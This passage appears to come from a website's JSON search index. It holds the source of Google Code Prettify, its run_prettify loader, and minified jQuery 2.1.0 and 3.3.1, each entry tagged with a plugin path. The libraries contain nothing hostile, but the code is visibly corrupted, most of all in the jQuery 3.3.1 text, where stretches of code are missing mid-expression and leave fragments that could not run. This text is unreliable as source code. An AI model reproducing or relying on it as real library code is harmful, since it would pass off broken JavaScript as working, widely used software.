, but in XML is a processing instruction var value = (nt === 7 || nt === 8) && preceder.nodeValue; if (value ? !/^\\??prettify\\b/.test(value) : (nt !== 3 || /\\S/.test(preceder.nodeValue))) { // Skip over white-space text nodes but not others. break; } if (value) { attrs = {}; value.replace( /\\b(\\w+)=([\\w:.%+-]+)/g, function (_, name, value) { attrs[name] = value; }); break; } } } var className = cs.className; if ((attrs !== EMPTY || prettyPrintRe.test(className)) // Don't redo this if we've already done it. // This allows recalling pretty print to just prettyprint elements // that have been added to the page since last call. && !prettyPrintedRe.test(className)) { // make sure this is not nested in an already prettified element var nested = false; for (var p = cs.parentNode; p; p = p.parentNode) { var tn = p.tagName; if (preCodeXmpRe.test(tn) && p.className && prettyPrintRe.test(p.className)) { nested = true; break; } } if (!nested) { // Mark done. If we fail to prettyprint for whatever reason, // we shouldn't try again. cs.className += ' prettyprinted'; // If the classes includes a language extensions, use it. // Language extensions can be specified like // // the language extension \"cpp\" is used to find a language handler // as passed to PR.registerLangHandler. // HTML5 recommends that a language be specified using \"language-\" // as the prefix instead. Google Code Prettify supports both. // http://dev.w3.org/html5/spec-author-view/the-code-element.html var langExtension = attrs['lang']; if (!langExtension) { langExtension = className.match(langExtensionRe); // Support var wrapper; if (!langExtension && (wrapper = childContentWrapper(cs)) && codeRe.test(wrapper.tagName)) { langExtension = wrapper.className.match(langExtensionRe); } if (langExtension) { langExtension = langExtension[1]; } } var preformatted; if (preformattedTagNameRe.test(cs.tagName)) { preformatted = 1; } else { var currentStyle = cs['currentStyle']; var defaultView = doc.defaultView; var whitespace = ( currentStyle ? currentStyle['whiteSpace'] : (defaultView && defaultView.getComputedStyle) ? defaultView.getComputedStyle(cs, null) .getPropertyValue('white-space') : 0); preformatted = whitespace && 'pre' === whitespace.substring(0, 3); } // Look for a class like linenums or linenums: where is the // 1-indexed number of the first line. var lineNums = attrs['linenums']; if (!(lineNums = lineNums === 'true' || +lineNums)) { lineNums = className.match(/\\blinenums\\b(?::(\\d+))?/); lineNums = lineNums ? lineNums[1] && lineNums[1].length ? +lineNums[1] : true : false; } if (lineNums) { numberLines(cs, lineNums, preformatted); } // do the pretty printing var prettyPrintingJob = { langExtension: langExtension, sourceNode: cs, numberLines: lineNums, pre: preformatted, sourceCode: null, basePos: null, spans: null, decorations: null }; applyDecorator(prettyPrintingJob); } } } if (k < elements.length) { // finish up in a continuation win.setTimeout(doWork, 250); } else if ('function' === typeof opt_whenDone) { opt_whenDone(); } } doWork(); } /** * Contains functions for creating and registering new language handlers. * @type {Object} */ var PR = win['PR'] = { 'createSimpleLexer': createSimpleLexer, 'registerLangHandler': registerLangHandler, 'sourceDecorator': sourceDecorator, 'PR_ATTRIB_NAME': PR_ATTRIB_NAME, 'PR_ATTRIB_VALUE': PR_ATTRIB_VALUE, 'PR_COMMENT': PR_COMMENT, 'PR_DECLARATION': PR_DECLARATION, 'PR_KEYWORD': PR_KEYWORD, 'PR_LITERAL': PR_LITERAL, 'PR_NOCODE': PR_NOCODE, 'PR_PLAIN': PR_PLAIN, 'PR_PUNCTUATION': PR_PUNCTUATION, 'PR_SOURCE': PR_SOURCE, 'PR_STRING': PR_STRING, 'PR_TAG': PR_TAG, 'PR_TYPE': PR_TYPE, 'prettyPrintOne': IN_GLOBAL_SCOPE ? (win['prettyPrintOne'] = $prettyPrintOne) : (prettyPrintOne = $prettyPrintOne), 'prettyPrint': IN_GLOBAL_SCOPE ? (win['prettyPrint'] = $prettyPrint) : (prettyPrint = $prettyPrint) }; // Make PR available via the Asynchronous Module Definition (AMD) API. // Per https://github.com/amdjs/amdjs-api/wiki/AMD: // The Asynchronous Module Definition (AMD) API specifies a // mechanism for defining modules such that the module and its // dependencies can be asynchronously loaded. // ... // To allow a clear indicator that a global define function (as // needed for script src browser loading) conforms to the AMD API, // any global define function SHOULD have a property called \"amd\" // whose value is an object. This helps avoid conflict with any // other existing JavaScript code that could have defined a define() // function that does not conform to the AMD API. var define = win['define']; if (typeof define === \"function\" && define['amd']) { define(\"google-code-prettify\", [], function () { return PR; }); } })();","link":"/plugins/prettify/prettify.js"},{"title":"","text":"/*! jQuery v2.1.0 | (c) 2005, 2014 jQuery Foundation, Inc. | jquery.org/license */ !function(a,b){\"object\"==typeof module&&\"object\"==typeof module.exports?module.exports=a.document?b(a,!0):function(a){if(!a.document)throw new Error(\"jQuery requires a window with a document\");return b(a)}:b(a)}(\"undefined\"!=typeof window?window:this,function(a,b){var c=[],d=c.slice,e=c.concat,f=c.push,g=c.indexOf,h={},i=h.toString,j=h.hasOwnProperty,k=\"\".trim,l={},m=a.document,n=\"2.1.0\",o=function(a,b){return new o.fn.init(a,b)},p=/^-ms-/,q=/-([\\da-z])/gi,r=function(a,b){return b.toUpperCase()};o.fn=o.prototype={jquery:n,constructor:o,selector:\"\",length:0,toArray:function(){return d.call(this)},get:function(a){return null!=a?0>a?this[a+this.length]:this[a]:d.call(this)},pushStack:function(a){var b=o.merge(this.constructor(),a);return b.prevObject=this,b.context=this.context,b},each:function(a,b){return o.each(this,a,b)},map:function(a){return this.pushStack(o.map(this,function(b,c){return a.call(b,c,b)}))},slice:function(){return this.pushStack(d.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(a){var b=this.length,c=+a+(0>a?b:0);return this.pushStack(c>=0&&b>c?[this[c]]:[])},end:function(){return this.prevObject||this.constructor(null)},push:f,sort:c.sort,splice:c.splice},o.extend=o.fn.extend=function(){var a,b,c,d,e,f,g=arguments[0]||{},h=1,i=arguments.length,j=!1;for(\"boolean\"==typeof g&&(j=g,g=arguments[h]||{},h++),\"object\"==typeof g||o.isFunction(g)||(g={}),h===i&&(g=this,h--);i>h;h++)if(null!=(a=arguments[h]))for(b in a)c=g[b],d=a[b],g!==d&&(j&&d&&(o.isPlainObject(d)||(e=o.isArray(d)))?(e?(e=!1,f=c&&o.isArray(c)?c:[]):f=c&&o.isPlainObject(c)?c:{},g[b]=o.extend(j,f,d)):void 0!==d&&(g[b]=d));return g},o.extend({expando:\"jQuery\"+(n+Math.random()).replace(/\\D/g,\"\"),isReady:!0,error:function(a){throw new Error(a)},noop:function(){},isFunction:function(a){return\"function\"===o.type(a)},isArray:Array.isArray,isWindow:function(a){return null!=a&&a===a.window},isNumeric:function(a){return a-parseFloat(a)>=0},isPlainObject:function(a){if(\"object\"!==o.type(a)||a.nodeType||o.isWindow(a))return!1;try{if(a.constructor&&!j.call(a.constructor.prototype,\"isPrototypeOf\"))return!1}catch(b){return!1}return!0},isEmptyObject:function(a){var b;for(b in a)return!1;return!0},type:function(a){return null==a?a+\"\":\"object\"==typeof a||\"function\"==typeof a?h[i.call(a)]||\"object\":typeof a},globalEval:function(a){var b,c=eval;a=o.trim(a),a&&(1===a.indexOf(\"use strict\")?(b=m.createElement(\"script\"),b.text=a,m.head.appendChild(b).parentNode.removeChild(b)):c(a))},camelCase:function(a){return a.replace(p,\"ms-\").replace(q,r)},nodeName:function(a,b){return a.nodeName&&a.nodeName.toLowerCase()===b.toLowerCase()},each:function(a,b,c){var d,e=0,f=a.length,g=s(a);if(c){if(g){for(;f>e;e++)if(d=b.apply(a[e],c),d===!1)break}else for(e in a)if(d=b.apply(a[e],c),d===!1)break}else if(g){for(;f>e;e++)if(d=b.call(a[e],e,a[e]),d===!1)break}else for(e in a)if(d=b.call(a[e],e,a[e]),d===!1)break;return a},trim:function(a){return null==a?\"\":k.call(a)},makeArray:function(a,b){var c=b||[];return null!=a&&(s(Object(a))?o.merge(c,\"string\"==typeof a?[a]:a):f.call(c,a)),c},inArray:function(a,b,c){return null==b?-1:g.call(b,a,c)},merge:function(a,b){for(var c=+b.length,d=0,e=a.length;c>d;d++)a[e++]=b[d];return a.length=e,a},grep:function(a,b,c){for(var d,e=[],f=0,g=a.length,h=!c;g>f;f++)d=!b(a[f],f),d!==h&&e.push(a[f]);return e},map:function(a,b,c){var d,f=0,g=a.length,h=s(a),i=[];if(h)for(;g>f;f++)d=b(a[f],f,c),null!=d&&i.push(d);else for(f in a)d=b(a[f],f,c),null!=d&&i.push(d);return e.apply([],i)},guid:1,proxy:function(a,b){var c,e,f;return\"string\"==typeof b&&(c=a[b],b=a,a=c),o.isFunction(a)?(e=d.call(arguments,2),f=function(){return a.apply(b||this,e.concat(d.call(arguments)))},f.guid=a.guid=a.guid||o.guid++,f):void 0},now:Date.now,support:l}),o.each(\"Boolean Number String Function Array Date RegExp Object Error\".split(\" \"),function(a,b){h[\"[object \"+b+\"]\"]=b.toLowerCase()});function s(a){var b=a.length,c=o.type(a);return\"function\"===c||o.isWindow(a)?!1:1===a.nodeType&&b?!0:\"array\"===c||0===b||\"number\"==typeof b&&b>0&&b-1 in a}var t=function(a){var b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s=\"sizzle\"+-new Date,t=a.document,u=0,v=0,w=eb(),x=eb(),y=eb(),z=function(a,b){return a===b&&(j=!0),0},A=\"undefined\",B=1","link":"/plugins/prettify/jquery.min.js"},{"title":"","text":"/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */ !function(e,t){\"use strict\";\"object\"==typeof module&&\"object\"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\"jQuery requires a window with a document\");return t(e)}:t(e)}(\"undefined\"!=typeof window?window:this,function(e,t){\"use strict\";var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\"function\"==typeof t&&\"number\"!=typeof t.nodeType},y=function e(t){return null!=t&&t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\"script\");if(o.text=e,n)for(i in v)n[i]&&(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\"\":\"object\"==typeof e||\"function\"==typeof e?l[c.call(e)]||\"object\":typeof e}var b=\"3.3.1\",w=function(e,t){return new w.fn.init(e,t)},T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype={jquery:\"3.3.1\",constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e1?(n=[e,e,\"\",t],r.setFilters.hasOwnProperty(e.toLowerCase())?se(function(e,n){var r,o=i(e,t),a=o.length;while(a--)e[r=O(e,o[a])]=!(n[r]=o[a])}):function(e){return i(e,0,n)}):i}},pseudos:{not:se(function(e){var t=[],n=[],r=s(e.replace(B,\"$1\"));return r[b]?se(function(e,t,n,i){var o,a=r(e,null,i,[]),s=e.length;while(s--)(o=a[s])&&(e[s]=!(t[s]=o))}):function(e,i,o){return t[0]=e,r(t,null,o,n),t[0]=null,!n.pop()}}),has:se(function(e){return function(t){return oe(e,t).length>0}}),contains:se(function(e){return e=e.replace(Z,ee),function(t){return(t.textContent||t.innerText||i(t)).indexOf(e)>-1}}),lang:se(function(e){return U.test(e||\"\")||oe.error(\"unsupported lang: \"+e),e=e.replace(Z,ee).toLowerCase(),function(t){var n;do{if(n=g?t.lang:t.getAttribute(\"xml:lang\")||t.getAttribute(\"lang\"))return(n=n.toLowerCase())===e||0===n.indexOf(e+\"-\")}while((t=t.parentNode)&&1===t.nodeType);return!1}}),target:function(t){var n=e.location&&e.location.hash;return n&&n.slice(1)===t.id},root:function(e){return e===h},focus:function(e){return e===d.activeElement&&(!d.hasFocus||d.hasFocus())&&!!(e.type||e.href||~e.tabIndex)},enabled:de(!1),disabled:de(!0),checked:function(e){var t=e.nodeName.toLowerCase();return\"input\"===t&&!!e.checked||\"option\"===t&&!!e.selected},selected:function(e){return e.parentNode&&e.parentNode.selectedIndex,!0===e.selected},empty:function(e){for(e=e.firstChild;e;e=e.nextSibling)if(e.nodeType=3?[null,e,null]:L.exec(e))||!i[1]&&t)return!t||t.jquery?(t||n).find(e):this.constructor(t).find(e);if(i[1]){if(t=t instanceof w?t[0]:t,w.merge(this,w.parseHTML(i[1],t&&t.nodeType?t.ownerDocument||t:r,!0)),A.test(i[1])&&w.isPlainObject(t))for(i in t)g(this[i])?this[i](t[i]):this.attr(i,t[i]);return this}return(o=r.getElementById(i[2]))&&(this[0]=o,this.length=1),this}return e.nodeType?(this[0]=e,this.length=1,this):g(e)?void 0!==n.ready?n.ready(e):e(w):w.makeArray(e,this)}).prototype=w.fn,q=w(r);var H=/^(?:parents|prev(?:Until|All))/,O={children:!0,contents:!0,next:!0,prev:!0};w.fn.extend({has:function(e){var t=w(e,this),n=t.length;return this.filter(function(){for(var e=0;e1&&(O[e]||w.uniqueSort(i),H.test(e)&&i.reverse()),this.pushStack(i)}});var M=/[^\\x20\\t\\r\\n\\f]+/g;function R(e){var t={};return w.each(e.match(M)||[],function(e,n){t[n]=!0}),t}w.Callbacks=function(e){e=\"string\"==typeof e?R(e):w.extend({},e);var t,n,r,i,o=[],a=[],s=-1,u=function(){for(i=i||e.once,r=t=!0;a.length;s=-1){n=a.shift();while(++s-1)o.splice(n,1),n-1:o.length>0},empty:function(){return o&&(o=[]),this},disable:function(){return i=a=[],o=n=\"\",this},disabled:function(){return!o},lock:function(){return i=a=[],n||t||(o=n=\"\"),this},locked:function(){return!!i},fireWith:function(e,n){return i||(n=[e,(n=n||[]).slice?n.slice():n],a.push(n),t||u()),this},fire:function(){return l.fireWith(this,arguments),this},fired:function(){return!!r}};return l};function I(e){return e}function W(e){throw e}function $(e,t,n,r){var i;try{e&&g(i=e.promise)?i.call(e).done(t).fail(n):e&&g(i=e.then)?i.call(e,t,n):t.apply(void 0,[e].slice(r))}catch(e){n.apply(void 0,[e])}}w.extend({Deferred:function(t){var n=[[\"notify\",\"progress\",w.Callbacks(\"memory\"),w.Callbacks(\"memory\"),2],[\"resolve\",\"done\",w.Callbacks(\"once memory\"),w.Callbacks(\"once memory\"),0,\"resolved\"],[\"reject\",\"fail\",w.Callbacks(\"once memory\"),w.Callbacks(\"once memory\"),1,\"rejected\"]],r=\"pending\",i={state:function(){return r},always:function(){return o.done(arguments).fail(arguments),this},\"catch\":function(e){return i.then(null,e)},pipe:function(){var e=arguments;return w.Deferred(function(t){w.each(n,function(n,r){var i=g(e[r[4]])&&e[r[4]];o[r[1]](function(){var e=i&&i.apply(this,arguments);e&&g(e.promise)?e.promise().progress(t.notify).done(t.resolve).fail(t.reject):t[r[0]+\"With\"](this,i?[e]:arguments)})}),e=null}).promise()},then:function(t,r,i){var o=0;function a(t,n,r,i){return function(){var s=this,u=arguments,l=function(){var e,l;if(!(t=o&&(r!==W&&(s=void 0,u=[e]),n.rejectWith(s,u))}};t?c():(w.Deferred.getStackHook&&(c.stackTrace=w.Deferred.getStackHook()),e.setTimeout(c))}}return w.Deferred(function(e){n[0][3].add(a(0,e,g(i)?i:I,e.notifyWith)),n[1][3].add(a(0,e,g(t)?t:I)),n[2][3].add(a(0,e,g(r)?r:W))}).promise()},promise:function(e){return null!=e?w.extend(e,i):i}},o={};return w.each(n,function(e,t){var a=t[2],s=t[5];i[t[1]]=a.add,s&&a.add(function(){r=s},n[3-e][2].disable,n[3-e][3].disable,n[0][2].lock,n[0][3].lock),a.add(t[3].fire),o[t[0]]=function(){return o[t[0]+\"With\"](this===o?void 0:this,arguments),this},o[t[0]+\"With\"]=a.fireWith}),i.promise(o),t&&t.call(o,o),o},when:function(e){var t=arguments.length,n=t,r=Array(n),i=o.call(arguments),a=w.Deferred(),s=function(e){return function(n){r[e]=this,i[e]=arguments.length>1?o.call(arguments):n,--t||a.resolveWith(r,i)}};if(t0||F.resolveWith(r,[w]))}}),w.ready.then=F.then;function _(){r.removeEventListener(\"DOMContentLoaded\",_),e.removeEventListener(\"load\",_),w.ready()}\"complete\"===r.readyState||\"loading\"!==r.readyState&&!r.documentElement.doScroll?e.setTimeout(w.ready):(r.addEventListener(\"DOMContentLoaded\",_),e.addEventListener(\"load\",_));var z=function(e,t,n,r,i,o,a){var s=0,u=e.length,l=null==n;if(\"object\"===x(n)){i=!0;for(s in n)z(e,t,s,n[s],!0,o,a)}else if(void 0!==r&&(i=!0,g(r)||(a=!0),l&&(a?(t.call(e,r),t=null):(l=t,t=function(e,t,n){return l.call(w(e),n)})),t))for(;s1,null,!0)},removeData:function(e){return this.each(function(){K.remove(this,e)})}}),w.extend({queue:function(e,t,n){var r;if(e)return t=(t||\"fx\")+\"queue\",r=J.get(e,t),n&&(!r||Array.isArray(n)?r=J.access(e,t,w.makeArray(n)):r.push(n)),r||[]},dequeue:function(e,t){t=t||\"fx\";var n=w.queue(e,t),r=n.length,i=n.shift(),o=w._queueHooks(e,t),a=function(){w.dequeue(e,t)};\"inprogress\"===i&&(i=n.shift(),r--),i&&(\"fx\"===t&&n.unshift(\"inprogress\"),delete o.stop,i.call(e,a,o)),!r&&o&&o.empty.fire()},_queueHooks:function(e,t){var n=t+\"queueHooks\";return J.get(e,n)||J.access(e,n,{empty:w.Callbacks(\"once memory\").add(function(){J.remove(e,[t+\"queue\",n])})})}}),w.fn.extend({queue:function(e,t){var n=2;return\"string\"!=typeof e&&(t=e,e=\"fx\",n--),arguments.length","link":"/plugins/prettify/jquery-3.3.1.min.js"},{"title":"","text":"/** * @license * Copyright (C) 2013 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * * Looks at query parameters to decide which language handlers and style-sheets * to load. * * Query Parameter Format Effect Default * +------------------+---------------+------------------------------+--------+ * | autorun= | true | false | If true then prettyPrint() | \"true\" | * | | | is called on page load. | | * +------------------+---------------+------------------------------+--------+ * | lang= | language name | Loads the language handler | Can | * | | | named \"lang-.js\". | appear | * | | | See available handlers at | many | * | | | https://github.com/google/ | times. | * | | | code-prettify/tree/master/ | | * | | | src | | * +------------------+---------------+------------------------------+--------+ * | skin= | skin name | Loads the skin stylesheet | none. | * | | | named \".css\". | | * | | | https://cdn.rawgit.com/ | | * | | | google/code-prettify/master/ | | * | | | styles/index.html | | * +------------------+---------------+------------------------------+--------+ * | callback= | JS identifier | When \"prettyPrint\" finishes | none | * | | | window.exports[js_ident] is | | * | | | called. | | * | | | The callback must be under | | * | | | exports to reduce the risk | | * | | | of XSS via query parameter | | * | | | injection. | | * +------------------+---------------+------------------------------+--------+ * * Examples * .../run_prettify.js?lang=css&skin=sunburst * 1. Loads the CSS language handler which can be used to prettify CSS * stylesheets, HTML element bodies and style=\"...\" attributes * values. * 2. Loads the sunburst.css stylesheet instead of the default prettify.css * stylesheet. * A gallery of stylesheets is available at * https://cdn.rawgit.com/google/code-prettify/master/styles/index.html * 3. Since autorun=false is not specified, calls prettyPrint() on page load. * */ /** * @typedef {!Array.} * Alternating indices and the decorations that should be inserted there. * The indices are monotonically increasing. */ var DecorationsT; /** * @typedef {!{ * sourceNode: !Element, * pre: !(number|boolean), * langExtension: ?string, * numberLines: ?(number|boolean), * sourceCode: ?string, * spans: ?(Array.), * basePos: ?number, * decorations: ?DecorationsT * }} * * sourceNodethe element containing the source * sourceCodesource as plain text * pretruthy if white-space in text nodes * should be considered significant. * spans alternating span start indices into source * and the text node or element (e.g. {@code }) corresponding to that * span. * decorationsan array of style classes preceded * by the position at which they start in job.sourceCode in order * basePosinteger position of this.sourceCode in the larger chunk of * source. * */ var JobT; /** * @typedef {!{ * sourceCode: string, * spans: !(Array.) * }} * * sourceCodesource as plain text * spans alternating span start indices into source * and the text node or element (e.g. {@code }) corresponding to that * span. * */ var SourceSpansT; /** @define {boolean} */ var IN_GLOBAL_SCOPE = false; (function () { \"use strict\"; var win = window; var doc = document; var root = doc.documentElement; var head = doc['head'] || doc.getElementsByTagName(\"head\")[0] || root; // From http://javascript.nwbox.com/ContentLoaded/contentloaded.js // Author: Diego Perini (diego.perini at gmail.com) // Summary: cross-browser wrapper for DOMContentLoaded // Updated: 20101020 // License: MIT // Version: 1.2 function contentLoaded(callback) { var addEventListener = doc['addEventListener']; var done = false, top = true, add = addEventListener ? 'addEventListener' : 'attachEvent', rem = addEventListener ? 'removeEventListener' : 'detachEvent', pre = addEventListener ? '' : 'on', init = function(e) { if (e.type == 'readystatechange' && doc.readyState != 'complete') { return; } (e.type == 'load' ? win : doc)[rem](pre + e.type, init, false); if (!done && (done = true)) { callback.call(win, e.type || e); } }, poll = function() { try { root.doScroll('left'); } catch(e) { win.setTimeout(poll, 50); return; } init('poll'); }; if (doc.readyState == 'complete') { callback.call(win, 'lazy'); } else { if (doc.createEventObject && root.doScroll) { try { top = !win.frameElement; } catch(e) { } if (top) { poll(); } } doc[add](pre + 'DOMContentLoaded', init, false); doc[add](pre + 'readystatechange', init, false); win[add](pre + 'load', init, false); } } // Given a list of URLs to stylesheets, loads the first that loads without // triggering an error event. function loadStylesheetsFallingBack(stylesheets) { var n = stylesheets.length; function load(i) { if (i === n) { return; } var link = doc.createElement('link'); link.rel = 'stylesheet'; link.type = 'text/css'; if (i + 1 < n) { // http://pieisgood.org/test/script-link-events/ indicates that many // versions of IE do not support onerror on s, though // http://msdn.microsoft.com/en-us/library/ie/ms535848(v=vs.85).aspx // indicates that recent IEs do support error. link.error = link.onerror = function () { load(i + 1); }; } link.href = stylesheets[i]; head.appendChild(link); } load(0); } var scriptQuery = ''; // Look for the node that loads this script to get its parameters. // This starts looking at the end instead of just considering the last // because deferred and async scripts run out of order. // If the script is loaded twice, then this will run in reverse order. var scripts = doc.getElementsByTagName('script'); for (var i = scripts.length; --i >= 0;) { var script = scripts[i]; var match = script.src.match( /^[^?#]*\\/run_prettify\\.js(\\?[^#]*)?(?:#.*)?$/); if (match) { scriptQuery = match[1] || ''; // Remove the script from the DOM so that multiple runs at least run // multiple times even if parameter sets are interpreted in reverse // order. script.parentNode.removeChild(script); break; } } // Pull parameters into local variables. var autorun = true; var langs = []; var skins = []; var callbacks = []; scriptQuery.replace( /[?&]([^&=]+)=([^&]+)/g, function (_, name, value) { value = decodeURIComponent(value); name = decodeURIComponent(name); if (name == 'autorun') { autorun = !/^[0fn]/i.test(value); } else if (name == 'lang') { langs.push(value); } else if (name == 'skin') { skins.push(value); } else if (name == 'callback') { callbacks.push(value); } }); // Use https to avoid mixed content warnings in client pages and to // prevent a MITM from rewrite prettify mid-flight. // This only works if this script is loaded via https : something // over which we exercise no control. var LOADER_BASE_URL = 'https://cdn.rawgit.com/google/code-prettify/master/loader'; for (var i = 0, n = langs.length; i < n; ++i) (function (lang) { var script = doc.createElement(\"script\"); // Excerpted from jQuery.ajaxTransport(\"script\") to fire events when // a script is finished loading. // Attach handlers for each script script.onload = script.onerror = script.onreadystatechange = function () { if (script && ( !script.readyState || /loaded|complete/.test(script.readyState))) { // Handle memory leak in IE script.onerror = script.onload = script.onreadystatechange = null; --pendingLanguages; checkPendingLanguages(); // Remove the script if (script.parentNode) { script.parentNode.removeChild(script); } script = null; } }; script.type = 'text/javascript'; script.src = LOADER_BASE_URL + '/lang-' + encodeURIComponent(langs[i]) + '.js'; // Circumvent IE6 bugs with base elements (#2709 and #4378) by prepending head.insertBefore(script, head.firstChild); })(langs[i]); var pendingLanguages = langs.length; function checkPendingLanguages() { if (!pendingLanguages) { win.setTimeout(onLangsLoaded, 0); } } var skinUrls = []; for (var i = 0, n = skins.length; i < n; ++i) { skinUrls.push(LOADER_BASE_URL + '/skins/' + encodeURIComponent(skins[i]) + '.css'); } skinUrls.push(LOADER_BASE_URL + '/prettify.css'); loadStylesheetsFallingBack(skinUrls); var prettyPrint = (function () { /** * @license * Copyright (C) 2006 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * some functions for browser-side pretty printing of code contained in html. * * * For a fairly comprehensive set of languages see the * README * file that came with this source. At a minimum, the lexer should work on a * number of languages including C and friends, Java, Python, Bash, SQL, HTML, * XML, CSS, Javascript, and Makefiles. It works passably on Ruby, PHP and Awk * and a subset of Perl, but, because of commenting conventions, doesn't work on * Smalltalk, Lisp-like, or CAML-like languages without an explicit lang class. * * Usage: * include this source file in an html page via * {@code } * define style rules. See the example page for examples. * mark the {@code } and {@code } tags in your source with * {@code class=prettyprint.} * You can also use the (html deprecated) {@code } tag, but the pretty * printer needs to do more substantial DOM manipulations to support that, so * some css styles may not be preserved. * * That's it. I wanted to keep the API as simple as possible, so there's no * need to specify which language the code is in, but if you wish, you can add * another class to the {@code } or {@code } element to specify the * language, as in {@code }. Any class that * starts with \"lang-\" followed by a file extension, specifies the file type. * See the \"lang-*.js\" files in this directory for code that implements * per-language file handlers. * * Change log: * cbeust, 2006/08/22 * * Java annotations (start with \"@\") are now captured as literals (\"lit\") * * @requires console */ // JSLint declarations /*global console, document, navigator, setTimeout, window, define */ /** * {@type !{ * 'createSimpleLexer': function (Array, Array): (function (JobT)), * 'registerLangHandler': function (function (JobT), Array.), * 'PR_ATTRIB_NAME': string, * 'PR_ATTRIB_NAME': string, * 'PR_ATTRIB_VALUE': string, * 'PR_COMMENT': string, * 'PR_DECLARATION': string, * 'PR_KEYWORD': string, * 'PR_LITERAL': string, * 'PR_NOCODE': string, * 'PR_PLAIN': string, * 'PR_PUNCTUATION': string, * 'PR_SOURCE': string, * 'PR_STRING': string, * 'PR_TAG': string, * 'PR_TYPE': string, * 'prettyPrintOne': function (string, string, number|boolean), * 'prettyPrint': function (?function, ?(HTMLElement|HTMLDocument)) * }} * @const */ var PR; /** * Split {@code prettyPrint} into multiple timeouts so as not to interfere with * UI events. * If set to {@code false}, {@code prettyPrint()} is synchronous. */ var PR_SHOULD_USE_CONTINUATION = true if (typeof window !== 'undefined') { window['PR_SHOULD_USE_CONTINUATION'] = PR_SHOULD_USE_CONTINUATION; } /** * Pretty print a chunk of code. * @param {string} sourceCodeHtml The HTML to pretty print. * @param {string} opt_langExtension The language name to use. * Typically, a filename extension like 'cpp' or 'java'. * @param {number|boolean} opt_numberLines True to number lines, * or the 1-indexed number of the first line in sourceCodeHtml. * @return {string} code as html, but prettier */ var prettyPrintOne; /** * Find all the {@code } and {@code } tags in the DOM with * {@code class=prettyprint} and prettify them. * * @param {Function} opt_whenDone called when prettifying is done. * @param {HTMLElement|HTMLDocument} opt_root an element or document * containing all the elements to pretty print. * Defaults to {@code document.body}. */ var prettyPrint; (function () { var win = (typeof window !== 'undefined') ? window : {}; // Keyword lists for various languages. // We use things that coerce to strings to make them compact when minified // and to defeat aggressive optimizers that fold large string constants. var FLOW_CONTROL_KEYWORDS = [\"break,continue,do,else,for,if,return,while\"]; var C_KEYWORDS = [FLOW_CONTROL_KEYWORDS,\"auto,case,char,const,default,\" + \"double,enum,extern,float,goto,inline,int,long,register,restrict,short,signed,\" + \"sizeof,static,struct,switch,typedef,union,unsigned,void,volatile\"]; var COMMON_KEYWORDS = [C_KEYWORDS,\"catch,class,delete,false,import,\" + \"new,operator,private,protected,public,this,throw,true,try,typeof\"]; var CPP_KEYWORDS = [COMMON_KEYWORDS,\"alignas,alignof,align_union,asm,axiom,bool,\" + \"concept,concept_map,const_cast,constexpr,decltype,delegate,\" + \"dynamic_cast,explicit,export,friend,generic,late_check,\" + \"mutable,namespace,noexcept,noreturn,nullptr,property,reinterpret_cast,static_assert,\" + \"static_cast,template,typeid,typename,using,virtual,where\"]; var JAVA_KEYWORDS = [COMMON_KEYWORDS, \"abstract,assert,boolean,byte,extends,finally,final,implements,import,\" + \"instanceof,interface,null,native,package,strictfp,super,synchronized,\" + \"throws,transient\"]; var CSHARP_KEYWORDS = [COMMON_KEYWORDS, \"abstract,add,alias,as,ascending,async,await,base,bool,by,byte,checked,decimal,delegate,descending,\" + \"dynamic,event,finally,fixed,foreach,from,get,global,group,implicit,in,interface,\" + \"internal,into,is,join,let,lock,null,object,out,override,orderby,params,\" + \"partial,readonly,ref,remove,sbyte,sealed,select,set,stackalloc,string,select,uint,ulong,\" + \"unchecked,unsafe,ushort,value,var,virtual,where,yield\"]; var COFFEE_KEYWORDS = \"all,and,by,catch,class,else,extends,false,finally,\" + \"for,if,in,is,isnt,loop,new,no,not,null,of,off,on,or,return,super,then,\" + \"throw,true,try,unless,until,when,while,yes\"; var JSCRIPT_KEYWORDS = [COMMON_KEYWORDS, \"abstract,async,await,constructor,debugger,enum,eval,export,from,function,\" + \"get,import,implements,instanceof,interface,let,null,of,set,undefined,\" + \"var,with,yield,Infinity,NaN\"]; var PERL_KEYWORDS = \"caller,delete,die,do,dump,elsif,eval,exit,foreach,for,\" + \"goto,if,import,last,local,my,next,no,our,print,package,redo,require,\" + \"sub,undef,unless,until,use,wantarray,while,BEGIN,END\"; var PYTHON_KEYWORDS = [FLOW_CONTROL_KEYWORDS, \"and,as,assert,class,def,del,\" + \"elif,except,exec,finally,from,global,import,in,is,lambda,\" + \"nonlocal,not,or,pass,print,raise,try,with,yield,\" + \"False,True,None\"]; var RUBY_KEYWORDS = [FLOW_CONTROL_KEYWORDS, \"alias,and,begin,case,class,\" + \"def,defined,elsif,end,ensure,false,in,module,next,nil,not,or,redo,\" + \"rescue,retry,self,super,then,true,undef,unless,until,when,yield,\" + \"BEGIN,END\"]; var SH_KEYWORDS = [FLOW_CONTROL_KEYWORDS, 